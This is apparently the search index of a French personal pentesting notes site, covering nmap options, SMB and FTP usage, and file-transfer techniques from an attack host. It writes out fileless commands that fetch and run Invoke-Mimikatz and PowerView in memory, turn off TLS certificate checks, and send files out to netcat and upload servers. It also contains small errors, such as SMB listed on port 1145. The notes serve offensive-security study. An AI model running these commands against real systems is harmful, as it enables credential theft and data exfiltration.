{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Bonjour, Vous d\u00e9couvrez ici mes documentations diverses","title":"Home"},{"location":"Hack/nmap/","text":"NMAP D\u00e9scription Nmap est un logiciel de cartographie de r\u00e9seaux qui s\u2019est impos\u00e9 comme l\u2019un des outils de d\u00e9couverte gratuits les plus populaires du march\u00e9. C\u2019est d\u00e9sormais l\u2019un des principaux outils de cartographie utilis\u00e9s par les administrateurs r\u00e9seau. Ce programme peut \u00eatre utilis\u00e9 pour trouver des h\u00f4tes actifs sur un r\u00e9seau, effectuer un balayage de ports, des balayages ping, ainsi que d\u00e9tecter le syst\u00e8me d\u2019exploitation d\u2019une machine et la version d\u2019un logiciel. Scan de r\u00e9seau nmap [Type de Scans] [Options] {Host cible} nmap -sP 192.168.1.1/24 # d\u00e9couverte de tout les hosts sur le r\u00e9seau 'scan et ping ) nmap 192.168.10,.0-255 # scan plage d'adresses 192.168.10.* 192.168.10.0/24 nmap -iL /host.txt # scan de host dans un fichier # options -v ou -vv # mode bavard --exclude 192.168.1.5 # exclure un host -sL 192.168.1.1/30 # liste simplement les ip du masque -PN 192.168.1.1/24 # pas de scan ping -PS 192.168.1.1/24 # ping tcp syn -PA # ping tcp ack -PU # ping udp -PE; -PP; -PM # ping icmp -PR # ping arp --exclude 192.168.1.1 # exclure ip -n # pas de dns -R # dns \u2013open # Afficher que les ports ouverts -oN # Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte -oX # Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML -p # Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner -Pn # D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te -r # Analyser les ports cons\u00e9cutivement -sT # Faire un scan de port TCP -sU # Faire un scan de port UDP -sV # Trouver les versions du service -script # Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc","title":"NMAP"},{"location":"Hack/nmap/#nmap","text":"","title":"NMAP"},{"location":"Hack/nmap/#description","text":"Nmap est un logiciel de cartographie de r\u00e9seaux qui s\u2019est impos\u00e9 comme l\u2019un des outils de d\u00e9couverte gratuits les plus populaires du march\u00e9. C\u2019est d\u00e9sormais l\u2019un des principaux outils de cartographie utilis\u00e9s par les administrateurs r\u00e9seau. Ce programme peut \u00eatre utilis\u00e9 pour trouver des h\u00f4tes actifs sur un r\u00e9seau, effectuer un balayage de ports, des balayages ping, ainsi que d\u00e9tecter le syst\u00e8me d\u2019exploitation d\u2019une machine et la version d\u2019un logiciel.","title":"D\u00e9scription"},{"location":"Hack/nmap/#scan-de-reseau","text":"nmap [Type de Scans] [Options] {Host cible} nmap -sP 192.168.1.1/24 # d\u00e9couverte de tout les hosts sur le r\u00e9seau 'scan et ping ) nmap 192.168.10,.0-255 # scan plage d'adresses 192.168.10.* 192.168.10.0/24 nmap -iL /host.txt # scan de host dans un fichier # options -v ou -vv # mode bavard --exclude 192.168.1.5 # exclure un host -sL 192.168.1.1/30 # liste simplement les ip du masque -PN 192.168.1.1/24 # pas de scan ping -PS 192.168.1.1/24 # ping tcp syn -PA # ping tcp ack -PU # ping udp -PE; -PP; -PM # ping icmp -PR # ping arp --exclude 192.168.1.1 # exclure ip -n # pas de dns -R # dns \u2013open # Afficher que les ports ouverts -oN # Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte -oX # Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML -p # Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner -Pn # D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te -r # Analyser les ports cons\u00e9cutivement -sT # Faire un scan de port TCP -sU # Faire un scan de port UDP -sV # Trouver les versions du service -script # Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc","title":"Scan de r\u00e9seau"},{"location":"Hack/telnet/","text":"telnet Les port et faille ftp Port 21/tcp compte \"anonymous\" = pass aucune importance telnet Port 23/tcp smb Port 1145/tcp smbclient -L <hote ou ip > # Liste des partages SMB -N # supprime la demande de mdp -U <user> # fourni un user Le client SMB dans un shell Interactive smbclient fournit aussi un shell interactif comme certains clients ftp (ncftp, lftp, \u2026). Dans ce dernier vous pouvez passer diff\u00e9rentes commandes pour effectuer les op\u00e9rations souhait\u00e9es. smbclient -U sambauser \"\\\\10.0.0.43\\partagedemo\" Si vous rencontrez l\u2019erreur suivante lors de la connexion SMB : Not enough '\\' characters in service Triplez l\u2019antislash pour la r\u00e9soudre, comme ceci : smbclient -U sambauser -L \"\\\\\\10.0.0.43\\partagedemo\" Envoyer des fichiers et des dossiers Les fichiers et les dossiers peuvent \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mput. Mais afin de t\u00e9l\u00e9charger un dossier sp\u00e9cifique et son contenu, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse. Le t\u00e9l\u00e9chargement peut \u00e9galement \u00eatre lanc\u00e9 avec la commande mput. smb: > recurse # Active le mode r\u00e9cursif smb: > mput Images # Upload du dossier Images smb: > recurse # D\u00e9sactive le mode r\u00e9cursif T\u00e9l\u00e9charger des fichiers et des dossiers Les fichiers et les dossiers peuvent \u00e9galement \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mget. S\u2019il y a plusieurs fichiers et dossiers \u00e0 t\u00e9l\u00e9charger, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse. smb: > recurse smb: > mget Images smb: > recurse Liste des attributs des fichiers et des dossiers smb: > allinfo monfichier.txt Redis R\u00e9dis (de l'anglais REmote DIctionary Server qui peut \u00eatre traduit par \u00ab serveur de dictionnaire distant \u00bb et jeu de mots avec Redistribute ) est un magasin de donn\u00e9es cl\u00e9-valeur NoSQL avanc\u00e9 open source utilis\u00e9 comme base de donn\u00e9es, cache et courtier de messages. Les donn\u00e9es sont stock\u00e9es dans un format de dictionnaire ayant des paires cl\u00e9-valeur. Il est g\u00e9n\u00e9ralement utilis\u00e9 pour le stockage \u00e0 court terme de donn\u00e9es n\u00e9cessitant une r\u00e9cup\u00e9ration rapide. Redis sauvegarde les donn\u00e9es sur les disques durs pour assurer la coh\u00e9rence","title":"telnet"},{"location":"Hack/telnet/#telnet","text":"","title":"telnet"},{"location":"Hack/telnet/#les-port-et-faille","text":"","title":"Les port et faille"},{"location":"Hack/telnet/#ftp","text":"Port 21/tcp compte \"anonymous\" = pass aucune importance","title":"ftp"},{"location":"Hack/telnet/#telnet_1","text":"Port 23/tcp","title":"telnet"},{"location":"Hack/telnet/#smb","text":"Port 1145/tcp smbclient -L <hote ou ip > # Liste des partages SMB -N # supprime la demande de mdp -U <user> # fourni un user Le client SMB dans un shell Interactive smbclient fournit aussi un shell interactif comme certains clients ftp (ncftp, lftp, \u2026). Dans ce dernier vous pouvez passer diff\u00e9rentes commandes pour effectuer les op\u00e9rations souhait\u00e9es. smbclient -U sambauser \"\\\\10.0.0.43\\partagedemo\" Si vous rencontrez l\u2019erreur suivante lors de la connexion SMB : Not enough '\\' characters in service Triplez l\u2019antislash pour la r\u00e9soudre, comme ceci : smbclient -U sambauser -L \"\\\\\\10.0.0.43\\partagedemo\"","title":"smb"},{"location":"Hack/telnet/#envoyer-des-fichiers-et-des-dossiers","text":"Les fichiers et les dossiers peuvent \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mput. Mais afin de t\u00e9l\u00e9charger un dossier sp\u00e9cifique et son contenu, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse. Le t\u00e9l\u00e9chargement peut \u00e9galement \u00eatre lanc\u00e9 avec la commande mput. smb: > recurse # Active le mode r\u00e9cursif smb: > mput Images # Upload du dossier Images smb: > recurse # D\u00e9sactive le mode r\u00e9cursif","title":"Envoyer des fichiers et des dossiers"},{"location":"Hack/telnet/#telecharger-des-fichiers-et-des-dossiers","text":"Les fichiers et les dossiers peuvent \u00e9galement \u00eatre t\u00e9l\u00e9charg\u00e9s avec la commande mget. S\u2019il y a plusieurs fichiers et dossiers \u00e0 t\u00e9l\u00e9charger, le mode r\u00e9cursif doit \u00eatre activ\u00e9 avec la commande recurse. smb: > recurse smb: > mget Images smb: > recurse","title":"T\u00e9l\u00e9charger des fichiers et des dossiers"},{"location":"Hack/telnet/#liste-des-attributs-des-fichiers-et-des-dossiers","text":"smb: > allinfo monfichier.txt","title":"Liste des attributs des fichiers et des dossiers"},{"location":"Hack/telnet/#redis","text":"R\u00e9dis (de l'anglais REmote DIctionary Server qui peut \u00eatre traduit par \u00ab serveur de dictionnaire distant \u00bb et jeu de mots avec Redistribute ) est un magasin de donn\u00e9es cl\u00e9-valeur NoSQL avanc\u00e9 open source utilis\u00e9 comme base de donn\u00e9es, cache et courtier de messages. Les donn\u00e9es sont stock\u00e9es dans un format de dictionnaire ayant des paires cl\u00e9-valeur. Il est g\u00e9n\u00e9ralement utilis\u00e9 pour le stockage \u00e0 court terme de donn\u00e9es n\u00e9cessitant une r\u00e9cup\u00e9ration rapide. Redis sauvegarde les donn\u00e9es sur les disques durs pour assurer la coh\u00e9rence","title":"Redis"},{"location":"Hack/transfert%20de%20fichier/","text":"Le transfert de fichier Powershell base64 d\u00e9code encode Check de la cl\u00e9 ssh en hash md5 admin@pc[/pc]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa Encodage de la cl\u00e9 en base64 >admin@pc[/pc]$ cat id_rsa |base64 -w 0;echo > >LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le d\u00e9coder. >PS C:\\pc> [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... Enfin, nous pouvons confirmer si le fichier a \u00e9t\u00e9 transf\u00e9r\u00e9 avec succ\u00e8s \u00e0 l'aide du Get-FileHash cmdlet, qui fait la m\u00eame chose que md5sum fait. PS C:\\pc> Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5 Algorithm Hash Path --------- ---- ---- MD5 4E301756A07DED0A2DD6953ABF015278 C:\\Users\\Public\\id_rsa T\u00e9l\u00e9chargements Web PowerShell PowerShell propose de nombreuses options de transfert de fichiers. Dans n'importe quelle version de PowerShell, le System.Net.WebClient peut \u00eatre utilis\u00e9e pour t\u00e9l\u00e9charger un fichier sur HTTP, HTTPS ou FTP. Les \u00e9l\u00e9ments suivants d\u00e9crivent les m\u00e9thodes WebClient pour t\u00e9l\u00e9charger des donn\u00e9es \u00e0 partir d'une ressource: Method Description OpenRead Renvoie les donn\u00e9es d'une ressource en tant que Flux. OpenReadAsync Renvoie les donn\u00e9es d'une ressource sans bloquer le thread appelant. DownloadData T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets. DownloadDataAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant. DownloadFile T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local. DownloadFileAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local sans bloquer le thread appelant. DownloadString T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource et renvoie une cha\u00eene. DownloadStringAsync T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource sans bloquer le fil appelant. M\u00e9thode PowerShell DownloadFile Nous pouvons sp\u00e9cifier le nom de la classe Net.WebClient et la m\u00e9thode DownloadFile avec les param\u00e8tres correspondant \u00e0 l'URL du fichier cible \u00e0 t\u00e9l\u00e9charger et le nom du fichier de sortie. PS C:\\pc> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') PS C:\\pc> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1') PS C:\\pc> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') PS C:\\pc> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1') PowerShell DownloadString - M\u00e9thode sans fichier Comme nous l'avons vu pr\u00e9c\u00e9demment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du syst\u00e8me d'exploitation pour t\u00e9l\u00e9charger la charge utile et l'ex\u00e9cuter directement. PowerShell peut \u00e9galement \u00eatre utilis\u00e9 pour effectuer des attaques sans fichier. Au lieu de t\u00e9l\u00e9charger un script PowerShell sur disque, nous pouvons l'ex\u00e9cuter directement en m\u00e9moire \u00e0 l'aide du Invoke-Expression cmdlet ou l'alias IEX. PS C:\\pc> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') IEX accepte \u00e9galement les entr\u00e9es de pipeline. PS C:\\pc> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX PowerShell Invoke-WebRequest \u00c0 partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est \u00e9galement disponible, mais il est nettement plus lent \u00e0 t\u00e9l\u00e9charger des fichiers. Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet. PS C:\\pc> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 https://gist.github.com/HarmJ0y/bb48307ffa663256e239 Erreurs courantes avec PowerShell Il peut y avoir des cas o\u00f9 la configuration du premier lancement d'Internet Explorer n'est pas termin\u00e9e, ce qui emp\u00eache le t\u00e9l\u00e9chargement. Cela peut \u00eatre contourn\u00e9 \u00e0 l'aide du param\u00e8tre -UseBasicParsing. PS C:\\pc> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand PS C:\\pc> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX Une autre erreur dans les t\u00e9l\u00e9chargements PowerShell est li\u00e9e au canal s\u00e9curis\u00e9 SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante: PS C:\\pc> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Exception calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\" At line:1 char:1 + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : WebException PS C:\\pc> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} T\u00e9l\u00e9chargements SMB Le protocole SMB qui s'ex\u00e9cute sur le port TCP / 445 est courant dans les r\u00e9seaux d'entreprise o\u00f9 les services Windows s'ex\u00e9cutent. Il permet aux applications et aux utilisateurs de transf\u00e9rer des fichiers vers et depuis des serveurs distants. Nous pouvons utiliser SMB pour t\u00e9l\u00e9charger facilement des fichiers depuis notre Pwnbox. Nous devons cr\u00e9er un serveur SMB dans notre Pwnbox avec smbserver.py de Impacket puis utiliser copy, move, PowerShell Copy-Item, ou tout autre outil permettant la connexion \u00e0 SMB. Cr\u00e9er le serveur SMB admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Copiez un fichier \u00e0 partir du serveur SMB C:\\pc> copy \\\\192.168.220.133\\share\\nc.exe 1 file(s) copied. Les nouvelles versions de Windows bloquent l'acc\u00e8s non authentifi\u00e9 des invit\u00e9s, comme nous pouvons le voir dans la commande suivante: C:\\pc> copy \\\\192.168.220.133\\share\\nc.exe You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network. Cr\u00e9ez le serveur SMB avec un nom d'utilisateur et un mot de passe admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Monter le serveur SMB avec nom d'utilisateur et mot de passe C:\\pc> net use n: \\\\192.168.220.133\\share /user:test test The command completed successfully. C:\\pc> copy n:\\nc.exe 1 file(s) copied. Remarque: Vous pouvez \u00e9galement monter le serveur SMB si vous recevez une erreur lorsque vous utilisez copy filename \\\\ IP \\ sharename . T\u00e9l\u00e9chargements FTP Une autre fa\u00e7on de transf\u00e9rer des fichiers consiste \u00e0 utiliser FTP ( File Transfer Protocol ), qui utilise le port TCP / 21 et TCP / 20. Nous pouvons utiliser le client FTP ou PowerShell Net.WebClient pour t\u00e9l\u00e9charger des fichiers \u00e0 partir d'un serveur FTP. Nous pouvons configurer un serveur FTP dans notre h\u00f4te d'attaque \u00e0 l'aide de Python3 pyftpdlib module. Il peut \u00eatre install\u00e9 avec la commande suivante: admin@pc[/pc]$ sudo pip3 install pyftpdlib Ensuite, nous pouvons sp\u00e9cifier le port num\u00e9ro 21 car, par d\u00e9faut, pyftpdlib utilise le port 2121. L'authentification anonyme est activ\u00e9e par d\u00e9faut si nous ne d\u00e9finissons pas d'utilisateur et de mot de passe. Configuration d'un serveur FTP Python3 admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 [I 2022-05-17 10:09:19] concurrency model: async [I 2022-05-17 10:09:19] masquerade (NAT) address: None [I 2022-05-17 10:09:19] passive ports: None [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<< Transf\u00e9rer des fichiers \u00e0 partir d'un serveur FTP \u00e0 l'aide de PowerShell PS C:\\pc> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt') Lorsque nous obtenons un shell sur une machine distante, nous n'avons peut-\u00eatre pas de shell interactif. Si tel est le cas, nous pouvons cr\u00e9er un fichier de commande FTP pour t\u00e9l\u00e9charger un fichier. Tout d'abord, nous devons cr\u00e9er un fichier contenant les commandes que nous voulons ex\u00e9cuter, puis utiliser le client FTP pour utiliser ce fichier pour t\u00e9l\u00e9charger ce fichier. Cr\u00e9er un fichier de commande pour le client FTP et t\u00e9l\u00e9charger le fichier cible C:\\pc> echo open 192.168.49.128 > ftpcommand.txt C:\\pc> echo USER anonymous >> ftpcommand.txt C:\\pc> echo binary >> ftpcommand.txt C:\\pc> echo GET file.txt >> ftpcommand.txt C:\\pc> echo bye >> ftpcommand.txt C:\\pc> ftp -v -n -s:ftpcommand.txt ftp> open 192.168.49.128 Log in with USER and PASS first. ftp> USER anonymous ftp> GET file.txt ftp> bye C:\\pc>more file.txt This is a test file Il existe \u00e9galement des situations telles que la fissuration par mot de passe, l'analyse, l'exfiltration, etc., o\u00f9 nous devons t\u00e9l\u00e9charger des fichiers de notre machine cible dans notre h\u00f4te d'attaque. Nous pouvons utiliser les m\u00eames m\u00e9thodes que nous avons utilis\u00e9es pr\u00e9c\u00e9dement. Voyons comment nous pouvons effectuer le t\u00e9l\u00e9chargement de fichiers de diff\u00e9rentes mani\u00e8res. PowerShell Base64 Encode & Decode Encoder le fichier \u00e0 l'aide de PowerShell ````powershell PS C:\\pc> [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte)) IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= PS C:\\pc> Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash Hash 3688374325B992DEF12793500307566D Nous copions ce contenu et le collons dans notre h\u00f4te d'attaque, utilisons la commande base64 pour le d\u00e9coder et utiliser le md5sum application pour confirmer le transfert s'est d\u00e9roul\u00e9 correctement. ### Decode Base64 String sous Linux ````sh admin@pc[/pc]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts admin@pc[/pc]$ md5sum hosts 3688374325b992def12793500307566d hosts T\u00e9l\u00e9chargements Web PowerShell PowerShell n'a pas de fonction int\u00e9gr\u00e9e pour les op\u00e9rations de t\u00e9l\u00e9chargement, mais nous pouvons utiliser Invoke-WebRequest ou Invoke-RestMethod pour construire notre fonction de t\u00e9l\u00e9chargement. Nous aurons \u00e9galement besoin d'un serveur Web qui accepte les t\u00e9l\u00e9chargements, ce qui n'est pas une option par d\u00e9faut dans la plupart des utilitaires de serveur Web courants. Pour notre serveur Web, nous pouvons utiliser serveur de telechargement , un module \u00e9tendu du Python http.Server , qui comprend une page de t\u00e9l\u00e9chargement de fichiers. Installons-le et d\u00e9marrons le serveur Web. Installation d'un serveur Web configur\u00e9 avec t\u00e9l\u00e9chargement admin@pc[/pc]$ pip3 install uploadserver Collecting upload server Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB) Installing collected packages: uploadserver Successfully installed uploadserver-2.0.1 admin@pc[/pc]$ python3 -m uploadserver File upload available at /upload Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Nous pouvons maintenant utiliser un script PowerShell PSUpload.ps1 qui utilise Invoke-WebRequest pour effectuer les op\u00e9rations de t\u00e9l\u00e9chargement. Le script accepte deux param\u00e8tres -File, que nous utilisons pour sp\u00e9cifier le chemin de fichier, et -Uri, l'URL du serveur o\u00f9 nous t\u00e9l\u00e9chargerons notre fichier. Essayons de t\u00e9l\u00e9charger le fichier h\u00f4te \u00e0 partir de notre h\u00f4te Windows. PS C:\\pc> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') PS C:\\pc> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts [+] File Uploaded: C:\\Windows\\System32\\drivers\\etc\\hosts [+] FileHash: 5E7241D66FD77E9E8EA866B6278B2373 T\u00e9l\u00e9chargement Web PowerShell Base64 Une autre fa\u00e7on d'utiliser les fichiers cod\u00e9s PowerShell et base64 pour les op\u00e9rations de t\u00e9l\u00e9chargement consiste \u00e0 utiliser Invoke-WebRequest ou Invoke-RestMethod avec Netcat. Nous utilisons Netcat pour \u00e9couter sur un port que nous sp\u00e9cifions et envoyer le fichier en tant que demande POST. Enfin, nous copions la sortie et utilisons la fonction de d\u00e9codage base64 pour convertir la cha\u00eene base64 en fichier. PS C:\\pc> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) PS C:\\pc> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64 Nous capturons les donn\u00e9es base64 avec Netcat et utilisons l'application base64 avec l'option de d\u00e9codage pour convertir la cha\u00eene en fichier. admin@pc[/pc]$ nc -lvnp 8000 listening on [any] 8000 ... connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923 POST / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682 Content-Type: application/x-www-form-urlencoded Host: 192.168.49.128:8000 Content-Length: 1820 Connection: Keep-Alive IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo ...SNIP... admin@pc[/pc]$ echo <base64> | base64 -d -w 0 > hosts 